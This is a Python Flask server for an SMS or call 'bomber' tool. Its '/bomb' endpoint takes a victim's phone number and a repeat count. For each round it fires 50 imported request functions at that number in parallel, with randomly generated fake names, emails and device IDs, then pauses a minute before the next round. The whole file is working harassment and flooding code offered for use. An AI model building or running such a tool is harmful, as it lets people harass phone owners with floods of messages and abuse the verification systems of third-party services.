import time
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, request, jsonify, make_response
from flask_cors import CORS

from api.utils import random_string
from api.batch1 import *
from api.batch2 import *
from api.batch3 import *
from api.batch4 import *
from api.batch5 import *

app = Flask(__name__, static_folder=".", static_url_path="")
CORS(app)

def process_number_api(number, amount):
    success_count = 0
    results = []

    for _ in range(amount):
        pgen = random_string("?n?n?n?n?n?n?n?n?n?n?n?n")
        egen = random_string("?n?n?n?n?n?n?n?n")
        did = random_string("?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i")
        did2 = random_string("?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i")
        name = random_string("?l?l?l?l?l?l")
        
        with ThreadPoolExecutor(max_workers=15) as executor:
            futures_with_names = []
            
            futures_with_names.append((executor.submit(api_1, number), "api_1"))
            futures_with_names.append((executor.submit(api_2, number), "api_2"))
            futures_with_names.append((executor.submit(api_3, number), "api_3"))
            futures_with_names.append((executor.submit(api_4, number), "api_4"))
            futures_with_names.append((executor.submit(api_5, number), "api_5"))
            futures_with_names.append((executor.submit(api_6, number), "api_6"))
            futures_with_names.append((executor.submit(api_7, number), "api_7"))
            futures_with_names.append((executor.submit(api_8, number), "api_8"))
            futures_with_names.append((executor.submit(api_9, number, pgen, egen, did, name), "api_9"))
            futures_with_names.append((executor.submit(api_10, number), "api_10"))
            futures_with_names.append((executor.submit(api_11, number), "api_11"))
            futures_with_names.append((executor.submit(api_12, number), "api_12"))
            futures_with_names.append((executor.submit(api_13, number), "api_13"))
            futures_with_names.append((executor.submit(api_14, number), "api_14"))
            futures_with_names.append((executor.submit(api_15, number), "api_15"))
            futures_with_names.append((executor.submit(api_16, number), "api_16"))
            futures_with_names.append((executor.submit(api_17, number), "api_17"))
            futures_with_names.append((executor.submit(api_18, number), "api_18"))
            futures_with_names.append((executor.submit(api_19, number), "api_19"))
            futures_with_names.append((executor.submit(api_20, number), "api_20"))
            futures_with_names.append((executor.submit(api_21, number), "api_21"))
            futures_with_names.append((executor.submit(api_22, number), "api_22"))
            futures_with_names.append((executor.submit(api_23, number), "api_23"))
            futures_with_names.append((executor.submit(api_24, number), "api_24"))
            futures_with_names.append((executor.submit(api_25, number), "api_25"))
            futures_with_names.append((executor.submit(api_26, number), "api_26"))
            futures_with_names.append((executor.submit(api_27, number), "api_27"))
            futures_with_names.append((executor.submit(api_28, number), "api_28"))
            futures_with_names.append((executor.submit(api_29, number), "api_29"))
            futures_with_names.append((executor.submit(api_30, number), "api_30"))
            futures_with_names.append((executor.submit(api_31, number, egen, name), "api_31"))
            futures_with_names.append((executor.submit(api_32, number), "api_32"))
            futures_with_names.append((executor.submit(api_33, number, pgen, name), "api_33"))
            futures_with_names.append((executor.submit(api_34, number), "api_34"))
            futures_with_names.append((executor.submit(api_35, number), "api_35"))
            futures_with_names.append((executor.submit(api_36, number), "api_36"))
            futures_with_names.append((executor.submit(api_37, number, pgen, egen, name), "api_37"))
            futures_with_names.append((executor.submit(api_38, number), "api_38"))
            futures_with_names.append((executor.submit(api_39, number, pgen, egen, name), "api_39"))
            futures_with_names.append((executor.submit(api_40, number), "api_40"))
            futures_with_names.append((executor.submit(api_41, number), "api_41"))
            futures_with_names.append((executor.submit(api_42, number), "api_42"))
            futures_with_names.append((executor.submit(api_43, number), "api_43"))
            futures_with_names.append((executor.submit(api_44, number), "api_44"))
            futures_with_names.append((executor.submit(api_45, number), "api_45"))
            futures_with_names.append((executor.submit(api_46, number), "api_46"))
            futures_with_names.append((executor.submit(api_47, number), "api_47"))
            futures_with_names.append((executor.submit(api_48, number), "api_48"))
            futures_with_names.append((executor.submit(api_49, number), "api_49"))
            futures_with_names.append((executor.submit(api_50, number), "api_50"))
            
            for future, api_name in futures_with_names:
                try:
                    result = future.result()
                    if result and result.status_code == 200:
                        success_count += 1
                        results.append({"status": "success", "api": api_name, "response_code": result.status_code})
                    else:
                        results.append({"status": "failed", "api": api_name, "response_code": result.status_code if result else "N/A"})
                except Exception as e:
                    results.append({"status": "error", "api": api_name, "error_message": str(e)})
        
        if _ < amount - 1:
            time.sleep(60)

    return {"total_requests_attempted": amount * 50, "successful_requests": success_count, "details": results}

@app.route('/')
def home():
    return app.send_static_file('index.html')

@app.route('/bomb', methods=['POST'])
def bomb_api():
    data = request.get_json()
    number = data.get('number')
    amount = data.get('amount')

    if not number or not amount:
        return jsonify({"error": "Please provide 'number' and 'amount' in the request body."}), 400
    
    try:
        amount = int(amount)
    except ValueError:
        return jsonify({"error": "'amount' must be an integer."}), 400

    if not (1 <= amount <= 100):
        return jsonify({"error": "'amount' must be between 1 and 100."}), 400

    try:
        result = process_number_api(number, amount)
        response = make_response(jsonify(result), 200)
        response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
        response.headers['Pragma'] = 'no-cache'
        response.headers['Expires'] = '0'
        return response
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
